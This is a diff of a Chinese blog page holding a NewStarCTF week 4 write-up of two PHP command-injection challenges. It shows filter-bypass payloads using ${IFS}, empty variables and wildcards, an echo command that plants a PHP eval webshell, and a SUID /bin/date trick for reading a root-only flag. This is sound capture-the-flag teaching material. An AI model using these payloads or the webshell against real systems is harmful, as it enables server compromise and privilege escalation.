@@ -16,19 +16,27 @@
   
     <meta name="keywords" content="" />
   
-  <meta name="description" content="#RCE绕过##题目源码1234567891011&lt;?phperror_reporting(0);if(isset($_GET[&quot;cmd&quot;]))&amp;#123;  if(preg_match(&amp;#x27;&#x2F;et|echo|cat|tac|base|sh|more|less|tail|vi|head|nl|env|fl|\||;|\^|\&amp;#x27;|\]|&quot;|&amp;lt">
+  <meta name="description" content="#RCE绕过##So Baby RCE1234567891011&lt;?phperror_reporting(0);if(isset($_GET[&quot;cmd&quot;]))&amp;#123;  if(preg_match(&amp;#x27;&#x2F;et|echo|cat|tac|base|sh|more|less|tail|vi|head|nl|env|fl|\||;|\^|\&amp;#x27;|\]|&amp;qu">
 <meta property="og:type" content="article">
 <meta property="og:title" content="RCE(NewStarCTF week4)">
 <meta property="og:url" content="http://wuz-zhong.github.io/2022/10/17/RCE1/index.html">
 <meta property="og:site_name" content="无终的博客">
-<meta property="og:description" content="#RCE绕过##题目源码1234567891011&lt;?phperror_reporting(0);if(isset($_GET[&quot;cmd&quot;]))&amp;#123;  if(preg_match(&amp;#x27;&#x2F;et|echo|cat|tac|base|sh|more|less|tail|vi|head|nl|env|fl|\||;|\^|\&amp;#x27;|\]|&quot;|&amp;lt">
+<meta property="og:description" content="#RCE绕过##So Baby RCE1234567891011&lt;?phperror_reporting(0);if(isset($_GET[&quot;cmd&quot;]))&amp;#123;  if(preg_match(&amp;#x27;&#x2F;et|echo|cat|tac|base|sh|more|less|tail|vi|head|nl|env|fl|\||;|\^|\&amp;#x27;|\]|&amp;qu">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://wuz-zhong.github.io/2022/10/17/RCE1/image-20221017184438860.png">
 <meta property="og:image" content="http://wuz-zhong.github.io/2022/10/17/RCE1/image-20221017190122084.png">
 <meta property="og:image" content="http://wuz-zhong.github.io/2022/10/17/RCE1/image-20221017191059612.png">
 <meta property="og:image" content="http://wuz-zhong.github.io/2022/10/17/RCE1/image-20221017214407915.png">
+<meta property="og:image" content="http://wuz-zhong.github.io/2022/10/17/RCE1/image-20221204171503925.png">
+<meta property="og:image" content="http://wuz-zhong.github.io/2022/10/17/RCE1/image-20221204175126290.png">
+<meta property="og:image" content="http://wuz-zhong.github.io/2022/10/17/RCE1/image-20221204175439106.png">
+<meta property="og:image" content="http://wuz-zhong.github.io/2022/10/17/RCE1/image-20221204175536828.png">
+<meta property="og:image" content="http://wuz-zhong.github.io/2022/10/17/RCE1/image-20221204175945111.png">
+<meta property="og:image" content="http://wuz-zhong.github.io/2022/10/17/RCE1/image-20221204180107381.png">
+<meta property="og:image" content="http://wuz-zhong.github.io/2022/10/17/RCE1/image-20221204181708505.png">
+<meta property="og:image" content="http://wuz-zhong.github.io/2022/10/17/RCE1/image-20221204181908514.png">
 <meta property="article:published_time" content="2022-10-17T09:58:57.000Z">
-<meta property="article:modified_time" content="2022-10-29T09:45:02.153Z">
+<meta property="article:modified_time" content="2022-12-04T10:20:07.399Z">
 <meta property="article:author" content="无终">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://wuz-zhong.github.io/2022/10/17/RCE1/image-20221017184438860.png">
@@ -183,7 +191,7 @@
                     <i class="fa fa-edit"></i> 
                     
                     
-                        ~1.90K
+                        ~2.27K
                     
                     字
                 </li>
@@ -194,13 +202,13 @@
             
             <div id="expire-alert" class="alert alert-warning hidden" role="alert">
                 <div class="icon"><i class="fa fa-warning"></i></div>
-                <div class="text"><p>本文最后编辑于 <time datetime="1667036702153"></time> 前，其中的内容可能需要更新。</p></div>
+                <div class="text"><p>本文最后编辑于 <time datetime="1670149207399"></time> 前，其中的内容可能需要更新。</p></div>
             </div>
             
             
             
             <hr />
-            <div itemprop="articleBody"><h1 id="RCE绕过"><a href="#RCE绕过" class="headerlink" title="#RCE绕过"></a>#RCE绕过</h1><h2 id="题目源码"><a href="#题目源码" class="headerlink" title="##题目源码"></a>##题目源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]))&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|echo|cat|tac|base|sh|more|less|tail|vi|head|nl|env|fl|\||;|\^|\&#x27;|\]|&quot;|&lt;|&gt;|`|\/| |\\\\|\*/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Don&#x27;t Hack Me&quot;</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+            <div itemprop="articleBody"><h1 id="RCE绕过"><a href="#RCE绕过" class="headerlink" title="#RCE绕过"></a>#RCE绕过</h1><h2 id="So-Baby-RCE"><a href="#So-Baby-RCE" class="headerlink" title="##So Baby RCE"></a>##So Baby RCE</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]))&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/et|echo|cat|tac|base|sh|more|less|tail|vi|head|nl|env|fl|\||;|\^|\&#x27;|\]|&quot;|&lt;|&gt;|`|\/| |\\\\|\*/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Don&#x27;t Hack Me&quot;</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <h3 id="分析"><a href="#分析" class="headerlink" title="###分析"></a>###分析</h3><p>RCE执行的位置在<code>system($_GET[&quot;cmd&quot;]);</code></p>
 <p>通过get方法传入一个叫cmd的参数，然后system执行。</p>
@@ -237,8 +245,37 @@
 <p>比如<code>cat</code>可以在其中加入一个空的变量<code>$1</code>让其变为<code>ca$1t</code>，从而绕过检测，而在代码执行中，空变量会被忽略。也就是最后执行的就是<code>cat</code>。</p>
 <p>而至于’*’被过滤，且fl被过滤，导致没办法利用任意数量匹配符来寻找文件，我们也可以利用单个匹配符‘?’来替换fl之间的连接，让其绕过检测。</p>
 <p>即ffff?lllaaaaggg，这样中间的’fl’就会因为通配符而不存在，后端执行的时候就会找到符合的文件。</p>
-<h2 id="最终的payload"><a href="#最终的payload" class="headerlink" title="##最终的payload"></a>##最终的payload</h2><p><code>payload=/?cmd=cd$&#123;IFS&#125;..%26%26ls%26%26cd$&#123;IFS&#125;..%26%26ls%26%26cd$&#123;IFS&#125;..%26%26ca$1t$&#123;IFS&#125;ffff%3Flllaaaaggggg</code></p>
+<h3 id="最终的payload"><a href="#最终的payload" class="headerlink" title="##最终的payload"></a>##最终的payload</h3><p><code>payload=/?cmd=cd$&#123;IFS&#125;..%26%26ls%26%26cd$&#123;IFS&#125;..%26%26ls%26%26cd$&#123;IFS&#125;..%26%26ca$1t$&#123;IFS&#125;ffff%3Flllaaaaggggg</code></p>
 <img src="/2022/10/17/RCE1/image-20221017214407915.png" class>
+
+<h2 id="So-Baby-RCE-again"><a href="#So-Baby-RCE-again" class="headerlink" title="##So Baby RCE again"></a>##So Baby RCE again</h2><p>改题目并未过滤echo，所以直接利用echo写入一句话木马</p>
+<img src="/2022/10/17/RCE1/image-20221204171503925.png" class>
+
+<p><code>?cmd=echo%20%27yes&lt;?php%20@eval($_POST[baby])?&gt;%27%20&gt;%20shell.php</code></p>
+<p>接着访问shell.php</p>
+<img src="/2022/10/17/RCE1/image-20221204175126290.png" class>
+
+<p>执行成功</p>
+<p>利用蚁剑连接，可以查看到疑似flag的文件</p>
+<img src="/2022/10/17/RCE1/image-20221204175439106.png" class>
+
+<p>点击查看文件却发现文件为空，利用cat命令读取会发现权限不够，这就是该题的要点。</p>
+<img src="/2022/10/17/RCE1/image-20221204175536828.png" class>
+
+<img src="/2022/10/17/RCE1/image-20221204175945111.png" class>
+<p>查看文件权限发现只有root权限才能查看</p>
+<img src="/2022/10/17/RCE1/image-20221204180107381.png" class>
+
+<p>再在该终端中，利用如下命令找到正在系统上运行的所有SUID可执行文件</p>
+<p><code>find /bin -perm -u=s -type f 2 &gt;/dev/null</code></p>
+<img src="/2022/10/17/RCE1/image-20221204181708505.png" class>
+
+<p>发现&#x2F;bin&#x2F;date有s权限</p>
+<p>于是使用date来查看flag文件</p>
+<img src="/2022/10/17/RCE1/image-20221204181908514.png" class>
+
+
+
 </div>
         </div>
         
@@ -306,7 +343,7 @@
             const twitterBase   = "https://twitter.com/intent/tweet?";
             const hostUrl       = "http://wuz-zhong.github.io/2022/10/17/RCE1/";
             const title         = "「RCE(NewStarCTF week4)」";
-            const excerpt       = `#RCE绕过##题目源码1234567891011&lt;?phperror_reporting(0);if(isset($_GET[&quot;cmd&quot;]))&#123;  if(preg_match(&#x27;/et|...`;
+            const excerpt       = `#RCE绕过##So Baby RCE1234567891011&lt;?phperror_reporting(0);if(isset($_GET[&quot;cmd&quot;]))&#123;  if(preg_match(&#x...`;
             let _URL;
             switch (dest) {
                 case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
@@ -328,7 +365,7 @@
                     
                 </div>
                 <div class="pull-date">
-                    <time datetime="2022-10-29T09:45:02.153Z" itemprop="dateModified">最后编辑：2022-10-29</time>
+                    <time datetime="2022-12-04T10:20:07.399Z" itemprop="dateModified">最后编辑：2022-12-04</time>
                 </div>
             </div>
         </footer>
@@ -379,7 +416,7 @@
                 文章
             </span>
             <span class="count">
-                7
+                8
             </span>
         </a>
         <a class="meta-item" href="/categories/">
@@ -417,6 +454,12 @@
         
           
           
+            <a class="list-group-item" href="/2022/12/11/CleverHacker/"><i class="fa  fa-book"></i> CleverHacker</a>
+            
+          
+        
+          
+          
             <a class="list-group-item" href="/2022/11/03/BabySSTI-Two/"><i class="fa  fa-book"></i> BabySSTI_Two</a>
             
           
@@ -440,11 +483,7 @@
           
         
           
-          
-            <a class="list-group-item" href="/2022/10/17/RCE1/"><i class="fa  fa-book"></i> RCE(NewStarCTF week4)</a>
             
-          
-        
           
             
           
